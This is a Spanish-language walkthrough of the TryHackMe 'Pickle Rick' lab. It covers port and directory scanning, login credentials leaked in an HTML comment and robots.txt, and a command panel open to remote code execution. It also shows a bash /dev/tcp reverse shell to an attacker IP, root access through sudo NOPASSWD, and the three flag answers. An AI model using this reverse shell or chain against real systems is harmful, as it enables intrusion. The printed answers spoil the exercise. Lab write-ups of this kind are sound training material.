# 🥒 Pickle Rick | TryHackMe 🧪  
**Dificultad**: Fácil | **Categoría**: CTF / Privilege Escalation  
**Objetivo**: Encontrar los 3 ingredientes para la pócima de Rick.

---

## 🛰️ 1. Reconocimiento inicial

```bash
ping -c 1 10.10.138.4
```

La máquina responde correctamente con una latencia de ~50ms y detectamos el ttl=63 propio de SO Linux.


## 🔍 2. Escaneo de puertos

```bash
nmap -p- --open -sS -sC -sV --min-rate=5000 -n -vvv -Pn 10.10.138.4 -oN escaneo.txt
```

### Puertos abiertos:

| Puerto | Servicio | Versión                    |
|--------|----------|----------------------------|
| 22     | SSH      | OpenSSH 8.2p1 Ubuntu       |
| 80     | HTTP     | Apache/2.4.41 (Ubuntu)     |


## 🌐 3. Análisis Web

Accediendo a `http://10.10.138.4/`

En el código fuente de la página encontramos un comentario revelador:

```html
<!-- Username: R1ckRul3s -->
```


## 🔐 4. Enumeración de rutas

Usamos Gobuster:

```bash
gobuster dir -u http://10.10.138.4 -w /usr/share/wordlists/dirb/common.txt -x .php,.html,.txt -b 403,404 -o rutas.txt
```

Rutas interesantes:
- `/login.php`: Login portal
- `/portal.php`: Panel de comandos
- `/robots.txt`: contiene `Wubbalubbadubdub`


## 🛂 5. Enumeración del portal

Al acceder a `/login.php` con las credenciales encontradas en index.html (R1ckRul3s) y en robots.txt (Wubbalubbadubdub), entramos en `/portal.php` y encontramos un **panel de comandos vulnerables a RCE**.


## 🐚 6. Reverse Shell

Ejecutamos una reverse shell desde el comando:

```bash
bash -c "sh -i >& /dev/tcp/10.21.203.111/4444 0>&1"
```

Se recibe la conexión como `www-data`.


## 🧪 7. Búsqueda de ingredientes

### 🧪 Primer ingrediente

📁 `/var/www/html/Sup3rS3cretPickl3Ingred.txt`

```bash
cat Sup3rS3cretPickl3Ingred.txt
# mr. meeseek hair
```


### 🧪 Segundo ingrediente

📁 `/home/rick/second ingredients`

```bash
cat 'second ingredients'
# 1 jerry tear
```


## 🔓 8. Escalada de privilegios

### Comprobamos sudo

```bash
sudo -l
```

Salida:

```
(ALL) NOPASSWD: ALL
```

Ejecutamos:

```bash
sudo /bin/bash
```

¡Acceso root conseguido!


### 🧪 Tercer ingrediente

📁 `/root/3rd.txt`

```bash
cat /root/3rd.txt
# 3rd ingredients: fleeb juice
```


## ✅ Conclusión

### Lecciones clave:

- Comentarios ocultos pueden revelar credenciales.
- Un panel vulnerable con ejecución de comandos permite acceso inicial.
- Revisar `sudo -l` es crucial para detectar escaladas fáciles.
